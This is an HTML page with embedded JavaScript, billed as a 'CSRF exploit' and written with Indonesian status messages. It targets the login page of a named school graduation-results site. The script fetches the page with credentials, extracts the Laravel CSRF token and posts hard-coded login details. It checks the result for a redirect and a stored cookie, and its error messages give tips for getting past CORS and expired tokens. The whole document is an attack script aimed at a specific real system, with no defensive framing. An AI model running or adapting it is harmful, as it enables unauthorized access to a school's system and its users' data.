<!DOCTYPE html>
<html>
<head>
    <title>🔥 SEVENTRASH CSRF EXPLOIT</title>
</head>
<body>
    <h1>🔥 SEVENTRASH CSRF EXPLOIT</h1>
    <div id="log" style="background:#000;color:#0f0;padding:20px;font-family:monospace;white-space:pre-wrap;min-height:400px;"></div>

    <script>
        (async function csrfExploit() {
            const log = document.getElementById('log');
            const targetUrl = 'https://kelulusan.esekolah.id/login';

            log.innerText = '⟳ MENJALANKAN EXPLOIT...\n\n';

            try {
                // ─── STEP 1: AMBIL HALAMAN LOGIN ───
                log.innerText += '⟳ Mengambil halaman login...\n';
                const page = await fetch(targetUrl, {
                    credentials: 'include'
                });
                const html = await page.text();
                log.innerText += '✅ Halaman login berhasil diambil.\n\n';

                // ─── STEP 2: EKSTRAK CSRF TOKEN ───
                log.innerText += '⟳ Mencari CSRF token...\n';
                
                // Cari token (Laravel biasanya di meta tag)
                let token = '';
                const meta = html.match(/<meta name="csrf-token" content="([^"]+)">/i);
                if (meta) {
                    token = meta[1];
                    log.innerText += '✅ Token ditemukan: ' + token.substring(0,30) + '...\n\n';
                }

                // ─── STEP 3: KIRIM LOGIN ───
                log.innerText += '⟳ Mengirim data login...\n';

                const form = new FormData();
                form.append('_token', token);
                form.append('username', 'exploit');
                form.append('password', 'exploit123');

                const response = await fetch(targetUrl, {
                    method: 'POST',
                    body: form,
                    credentials: 'include',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Referer': targetUrl
                    }
                });

                // ─── STEP 4: HASIL ───
                const result = await response.text();
                log.innerText += '✅ Status: ' + response.status + '\n';
                log.innerText += '✅ URL: ' + response.url + '\n\n';

                if (response.status === 419) {
                    log.innerText += '❌ ERROR 419: CSRF Token expired!\n';
                    log.innerText += '💀 SOLUSI: Buka halaman login di browser, refresh, ambil token baru.\n';
                } else if (response.url !== targetUrl) {
                    log.innerText += '✅✅✅ LOGIN BERHASIL! Anda diarahkan ke: ' + response.url + '\n';
                    log.innerText += '🍪 Cookie tersimpan di browser Anda!\n';
                } else {
                    log.innerText += '⚠️ Login gagal. Cek username/password.\n';
                }

                // Tampilkan preview response
                log.innerText += '\n--- PREVIEW RESPONSE ---\n';
                log.innerText += result.substring(0, 600) + '\n...\n';

            } catch (err) {
                log.innerText += '❌ ERROR: ' + err.message + '\n';
                log.innerText += '💀 INI REAL! GAGAL KARENA CORS.\n';
                log.innerText += '🔥 SOLUSI: Buka file HTML ini di browser yang SAMA dengan target.\n';
            }
        })();
    </script>
</body>
</html>
